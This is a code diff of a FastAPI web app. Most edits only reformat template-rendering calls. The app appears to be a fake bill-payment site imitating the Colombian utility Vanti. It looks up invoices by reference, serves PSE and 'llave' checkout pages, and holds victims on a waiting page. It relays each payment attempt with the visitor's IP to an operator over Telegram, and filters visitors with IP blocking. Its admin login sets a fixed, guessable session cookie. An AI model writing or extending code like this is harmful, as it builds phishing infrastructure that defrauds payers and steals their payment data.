@@ -81,14 +81,16 @@ async def check_ip_blocking(request: Request, call_next):
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
-    return templates.TemplateResponse(request, "index.html", {"error": None})
+    return templates.TemplateResponse(
+        request=request, name="index.html", context={"error": None}
+    )
 
 @app.post("/consultar", response_class=HTMLResponse)
 async def consultar(
     request: Request, 
     empresa: str = Form(...), 
     referencia: str = Form(...),
-    metodo_pago: str = Form("pse")  # Captura el método seleccionado
+    metodo_pago: str = Form("pse")
 ):
     ip = get_client_ip(request)
     
@@ -96,9 +98,10 @@ async def consultar(
     resultado = await consultar_factura_vanti(empresa, referencia)
     
     if not resultado.get("success"):
-        return templates.TemplateResponse(request, "index.html", {
-            "error": resultado.get("message", "Error al consultar la referencia.")
-        })
+        return templates.TemplateResponse(
+            request=request, name="index.html",
+            context={"error": resultado.get("message", "Error al consultar la referencia.")}
+        )
     
     # Guardar en Base de Datos
     monto = float(resultado.get("amount", 0))
@@ -116,19 +119,25 @@ async def consultar(
 
     # Redirección según método elegido
     if metodo_pago == "llave":
-        return templates.TemplateResponse(request, "checkout_llave.html", {
+        return templates.TemplateResponse(
+            request=request, name="checkout_llave.html",
+            context={
+                "tx_id": tx_id,
+                "referencia": referencia,
+                "monto": int(monto),
+                "empresa": empresa
+            }
+        )
+
+    return templates.TemplateResponse(
+        request=request, name="checkout.html",
+        context={
             "tx_id": tx_id,
             "referencia": referencia,
             "monto": int(monto),
             "empresa": empresa
-        })
-
-    return templates.TemplateResponse(request, "checkout.html", {
-        "tx_id": tx_id,
-        "referencia": referencia,
-        "monto": int(monto),
-        "empresa": empresa
-    })
+        }
+    )
 
 @app.post("/procesar-pago-pse", response_class=RedirectResponse)
 async def procesar_pago_pse(
@@ -178,7 +187,6 @@ async def procesar_pago_pse(
 
     return RedirectResponse(url=url_destino, status_code=303)
 
-# --- NUEVA RUTA AGREGADA PARA PROCESAR EL PAGO CON LLAVE ---
 @app.post("/procesar-pago-llave", response_class=HTMLResponse)
 async def procesar_pago_llave(
     request: Request,
@@ -212,11 +220,8 @@ async def procesar_pago_llave(
                 f"• <b>IP:</b> {ip}"
             )
 
-        # Renderizado compatible con todas las versiones de FastAPI
         return templates.TemplateResponse(
-            request=request,
-            name="esperando.html",
-            context={"tx_id": tx_id}
+            request=request, name="esperando.html", context={"tx_id": tx_id}
         )
 
     except Exception as e:
@@ -246,7 +251,9 @@ async def notificar_pago(request: Request, tx_id: int = Form(...)):
             f"• <b>IP:</b> {ip}"
         )
 
-    return templates.TemplateResponse(request, "esperando.html", {"tx_id": tx_id})
+    return templates.TemplateResponse(
+        request=request, name="esperando.html", context={"tx_id": tx_id}
+    )
 
 @app.get("/estado_pago/{tx_id}")
 async def estado_pago(tx_id: int):
@@ -258,7 +265,9 @@ async def estado_pago(tx_id: int):
 @app.get("/resultado/{tx_id}", response_class=HTMLResponse)
 async def resultado_final(request: Request, tx_id: int):
     tx = obtener_transaccion(tx_id)
-    return templates.TemplateResponse(request, "estado.html", {"tx": tx})
+    return templates.TemplateResponse(
+        request=request, name="estado.html", context={"tx": tx}
+    )
 
 # --- PANEL DE ADMINISTRACIÓN Y TELEGRAM ---
 
@@ -267,7 +276,9 @@ async def admin_login_page(request: Request):
     otp = str(random.randint(100000, 999999))
     guardar_otp_admin(otp)
     enviar_mensaje_telegram(f"🔐 <b>Código de Seguridad para Admin:</b> <code>{otp}</code>")
-    return templates.TemplateResponse(request, "admin_login.html", {"error": None})
+    return templates.TemplateResponse(
+        request=request, name="admin_login.html", context={"error": None}
+    )
 
 @app.post("/admin/login")
 async def admin_login_post(request: Request, otp: str = Form(...)):
@@ -275,7 +286,9 @@ async def admin_login_post(request: Request, otp: str = Form(...)):
         response = RedirectResponse(url="/admin", status_code=303)
         response.set_cookie(key="admin_session", value="authenticated_vanti", httponly=True)
         return response
-    return templates.TemplateResponse(request, "admin_login.html", {"error": "Código OTP inválido o expirado."})
+    return templates.TemplateResponse(
+        request=request, name="admin_login.html", context={"error": "Código OTP inválido o expirado."}
+    )
 
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_panel(request: Request):
@@ -284,10 +297,13 @@ async def admin_panel(request: Request):
 
     transacciones = obtener_todas_transacciones()
     metricas = obtener_metricas()
-    return templates.TemplateResponse(request, "admin.html", {
-        "transacciones": transacciones,
-        "metricas": metricas
-    })
+    return templates.TemplateResponse(
+        request=request, name="admin.html",
+        context={
+            "transacciones": transacciones,
+            "metricas": metricas
+        }
+    )
 
 @app.get("/admin/datos")
 async def admin_datos(request: Request):
